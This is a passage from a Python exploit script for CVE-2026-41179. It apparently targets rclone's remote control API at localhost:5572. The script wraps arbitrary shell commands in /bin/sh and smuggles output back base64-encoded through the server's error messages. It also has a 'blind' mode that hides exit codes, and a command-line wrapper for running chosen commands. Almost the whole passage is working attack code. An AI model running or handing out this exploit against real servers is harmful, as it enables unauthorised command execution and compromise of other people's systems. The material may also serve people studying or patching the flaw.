s output of any commands to STDERR, uses base64 to encode output\n    > Note, will floods rclone log with error messages\n    \"\"\"\n    exec_command = f\"\"\"/bin/sh -c \"set -o pipefail; {command} 2>&1 | base64 | tee /dev/stderr > /dev/null; if [ $? -ne 0 ]; then exit 255; else exit $?; fi\" \"\"\"\n    exec_command = urllib.parse.quote_plus(exec_command)\n\n    response = cve_2026_41179(base_url, exec_command)\n    raw_error = response.get(\"error\")\n    return_code = raw_error.split(\":\")[-1].strip()\n    encoded_output = raw_error.split(\":\")[-2].strip()\n\n    # 255 is STDOUT, anything else is an error \n    print(return_code)\n    if return_code == \"exit status 255\":\n        return_code = \"ERR\"\n    else:\n        return_code = \"OK\"\n\n    print(f\"Return code: {return_code}\")\n\n    print(\"OUTPUT\")\n    if not encoded_output:\n        print(\"N/A\")\n    else:\n        try:\n            decoded_output = b64decode(encoded_output).decode()\n            print(decoded_output)\n        except:\n            print(encoded_output)\n\n\ndef cve_2026_41179_command_blind(base_url, command):\n    \"\"\"\n    Blind command runner\n    > Ensures return codes are always 0, no visible output\n    \"\"\"\n\n    exec_command = f\"\"\"/bin/sh -c \"set -o pipefail; {command} 2>&1 | tee /dev/stdout > /dev/null; if [ $? -ne 0 ]; then exit 0; else exit 0; fi\" \"\"\"\n    exec_command = urllib.parse.quote_plus(exec_command)\n    response = cve_2026_41179(base_url, exec_command )\n    print(f\"\"\"Executed as {response.get(\"Name\")}\"\"\")\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"CVE-2026-41179\")\n    parser.add_argument(\"-u\", \"--base-url\", default=\"http://localhost:5572\")\n    parser.add_argument(\"-b\", action=\"store_true\", default=False, dest=\"BLIND\")\n    parser.add_argument('command', nargs=argparse.REMAINDER, help=\"Try sleep 3\")\n    args = parser.parse_args()\n\n    args.command = \" \".join(args.comman